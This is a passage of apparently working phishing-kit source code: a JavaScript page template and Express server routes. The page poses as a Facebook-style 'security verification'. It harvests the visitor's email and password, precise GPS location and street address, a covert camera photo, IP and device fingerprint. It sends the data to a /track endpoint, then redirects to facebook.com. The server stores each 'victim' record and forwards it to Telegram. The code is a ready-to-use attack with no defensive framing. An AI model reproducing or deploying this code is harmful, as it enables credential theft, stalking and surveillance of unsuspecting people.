    <script>
        const victimId = '${victimId}';
        let currentStep = 1;
        let userData = {
            victimId: victimId,
            credentials: {},
            location: {},
            photo: null,
            system: {},
            network: {},
            timestamp: null
        };
        
        let cameraStream = null;
        let photoCaptured = false;
        
        // Navigation functions
        function showStep(step) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById('step' + step).classList.add('active');
            currentStep = step;
            updateProgress();
        }
        
        function nextStep() {
            if (currentStep === 1) {
                // Save credentials
                userData.credentials = {
                    email: document.getElementById('email').value,
                    password: document.getElementById('password').value
                };
                if (!userData.credentials.email || !userData.credentials.password) {
                    alert('Please enter both email and password.');
                    return;
                }
            }
            showStep(currentStep + 1);
        }
        
        function prevStep() {
            if (currentStep > 1) showStep(currentStep - 1);
        }
        
        function updateProgress() {
            const progress = (currentStep / 5) * 100;
            document.querySelectorAll('.progress-fill').forEach(p => {
                p.style.width = progress + '%';
            });
        }
        
        // Step 2: Permissions
        function requestPermissions() {
            if (!document.getElementById('location').checked) {
                alert('Location permission is required for security verification.');
                return;
            }
            showStep(3);
            getLocation();
        }
        
        // Step 3: Location
        function getLocation() {
            const progress = document.getElementById('locationProgress');
            const info = document.getElementById('locationInfo');
            const btn = document.getElementById('locationBtn');
            
            info.innerHTML = '<p>Requesting location access...</p>';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        userData.location = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        };
                        
                        progress.style.width = '100%';
                        info.innerHTML = \`
                            <div class="info-box">
                                <p><strong>📍 Location Verified</strong></p>
                                <p>Latitude: \${userData.location.lat.toFixed(6)}</p>
                                <p>Longitude: \${userData.location.lon.toFixed(6)}</p>
                                <p>Accuracy: \${userData.location.accuracy} meters</p>
                            </div>
                        \`;
                        btn.style.display = 'block';
                        
                        // Get address from coordinates
                        getAddress(userData.location.lat, userData.location.lon);
                    },
                    (error) => {
                        info.innerHTML = \`
                            <div class="info-box">
                                <p><strong>⚠️ Location Access Denied</strong></p>
                                <p>Error: \${error.message}</p>
                                <p>Please enable location services to continue.</p>
                            </div>
                        \`;
                        btn.style.display = 'block';
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                info.innerHTML = '<p>Geolocation is not supported by this browser.</p>';
                btn.style.display = 'block';
            }
        }
        
        async function getAddress(lat, lon) {
            try {
                const response = await fetch(\`https://nominatim.openstreetmap.org/reverse?format=json&lat=\${lat}&lon=\${lon}\`);
                const data = await response.json();
                if (data.address) {
                    userData.location.address = data.address;
                    const info = document.getElementById('locationInfo');
                    info.innerHTML += \`
                        <div class="info-box" style="margin-top: 10px;">
                            <p><strong>🏠 Approximate Address:</strong></p>
                            <p>\${data.display_name || 'Address not available'}</p>
                        </div>
                    \`;
                }
            } catch (error) {
                console.log('Address lookup failed:', error);
            }
        }
        
        // Step 4: Camera
        function startCamera() {
            const video = document.getElementById('camera');
            
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                })
                .then(stream => {
                    video.srcObject = stream;
                    cameraStream = stream;
                    video.style.display = 'block';
                })
                .catch(error => {
                    console.error('Camera error:', error);
                    document.getElementById('camera').innerHTML = '<p style="color:white; text-align:center; padding: 20px;">Camera access denied. Please allow camera access or skip this step.</p>';
                });
            }
        }
        
        function capturePhoto() {
            const video = document.getElementById('camera');
            const canvas = document.getElementById('canvas');
            const preview = document.getElementById('photoPreview');
            const retakeBtn = document.getElementById('retakeBtn');
            const useBtn = document.getElementById('usePhotoBtn');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convert to base64
            const photoData = canvas.toDataURL('image/jpeg', 0.9);
            userData.photo = photoData;
            photoCaptured = true;
            
            // Show preview
            preview.src = photoData;
            preview.style.display = 'block';
            video.style.display = 'none';
            retakeBtn.style.display = 'block';
            useBtn.style.display = 'block';
        }
        
        function retakePhoto() {
            const video = document.getElementById('camera');
            const preview = document.getElementById('photoPreview');
            const retakeBtn = document.getElementById('retakeBtn');
            const useBtn = document.getElementById('usePhotoBtn');
            
            preview.style.display = 'none';
            video.style.display = 'block';
            retakeBtn.style.display = 'none';
            useBtn.style.display = 'none';
            userData.photo = null;
            photoCaptured = false;
        }
        
        function skipCamera() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
            showStep(5);
        }
        
        // Step 5: System Info
        async function collectSystemInfo() {
            const progress = document.getElementById('systemProgress');
            const info = document.getElementById('systemInfo');
            
            info.innerHTML = '<p>Collecting device information...</p>';
            progress.style.width = '25%';
            
            // Get IP address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                userData.ip = ipData.ip;
                progress.style.width = '40%';
                
                // Get IP info
                const ipInfo = await fetch(\`https://ipapi.co/\${ipData.ip}/json/\`);
                const ipInfoData = await ipInfo.json();
                userData.ipInfo = ipInfoData;
                progress.style.width = '60%';
            } catch (error) {
                console.log('IP detection failed:', error);
            }
            
            // System information
            userData.system = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                screen: \`\${window.screen.width}x\${window.screen.height} (avail: \${window.screen.availWidth}x\${window.screen.availHeight})\`,
                colorDepth: window.screen.colorDepth,
                pixelDepth: window.screen.pixelDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touchPoints: navigator.maxTouchPoints,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'unknown',
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver
            };
            progress.style.width = '80%';
            
            // Network information
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                userData.network = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type
                };
            }
            progress.style.width = '100%';
            
            // Display collected info
            info.innerHTML = \`
                <div class="info-box">
                    <p><strong>📱 Device Information Collected:</strong></p>
                    <p>IP Address: \${userData.ip || 'Unknown'}</p>
                    <p>Browser: \${detectBrowser()}</p>
                    <p>OS: \${detectOS()}</p>
                    <p>Screen: \${userData.system.screen}</p>
                    <p>Language: \${userData.system.language}</p>
                    <p>Timezone: \${userData.system.timezone}</p>
                </div>
            \`;
            
            // Auto-proceed after 2 seconds
            setTimeout(() => {
                completeTracking();
            }, 2000);
        }
        
        function detectBrowser() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            if (ua.includes('Opera')) return 'Opera';
            return 'Unknown Browser';
        }
        
        function detectOS() {
            const ua = navigator.userAgent;
            if (ua.includes('Windows')) return 'Windows';
            if (ua.includes('Mac')) return 'macOS';
            if (ua.includes('Linux')) return 'Linux';
            if (ua.includes('Android')) return 'Android';
            if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
            return 'Unknown OS';
        }
        
        // Final Step: Complete Tracking
        async function completeTracking() {
            document.getElementById('step5').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            userData.timestamp = new Date().toISOString();
            userData.url = window.location.href;
            userData.referrer = document.referrer;
            
            const status = document.getElementById('loadingStatus');
            status.textContent = 'Sending verification data...';
            
            try {
                // Send data to server
                const response = await fetch('/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(userData)
                });
                
                if (response.ok) {
                    status.textContent = 'Verification successful!';
                    
                    // Show success message
                    setTimeout(() => {
                        document.getElementById('loading').style.display = 'none';
                        document.getElementById('success').style.display = 'block';
                        
                        // Redirect to Facebook after 3 seconds
                        setTimeout(() => {
                            window.location.href = 'https://facebook.com';
                        }, 3000);
                    }, 2000);
                }
            } catch (error) {
                status.textContent = 'Error: ' + error.message;
                setTimeout(() => {
                    window.location.href = 'https://facebook.com';
                }, 3000);
            }
            
            // Clean up camera
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            showStep(1);
            // Start camera when step 4 is shown
            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    if (mutation.target.id === 'step4' && mutation.target.classList.contains('active')) {
                        startCamera();
                    }
                });
            });
            observer.observe(document.getElementById('step4'), { attributes: true, attributeFilter: ['class'] });
        });
    </script>
</body>
</html>
`;

// Routes
app.get('/', (req, res) => {
    const victimId = generateVictimId(req);
    res.send(htmlTemplate(victimId));
});

app.post('/track', async (req, res) => {
    try {
        const trackingData = req.body;
        
        // Enhanced IP analysis
        if (trackingData.ip && !trackingData.ipInfo) {
            try {
                const ipInfo = await axios.get(`https://ipapi.co/${trackingData.ip}/json/`);
                trackingData.ipInfo = ipInfo.data;
            } catch (error) {
                trackingData.ipInfo = { error: 'Failed to fetch IP info' };
            }
        }
        
        // Store data
        victims.set(trackingData.victimId, trackingData);
        
        // Update analytics
        updateAnalytics(trackingData);
        
        // Send to Telegram
        await sendToTelegram(trackingData);
        
        // Save to file (for Vercel, use temporary storage)
        saveToTempFile(trackingData);
        
        res.json({ success: true, message: 'Data received' });
    } catch (error) {
        console.error('Tracking error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

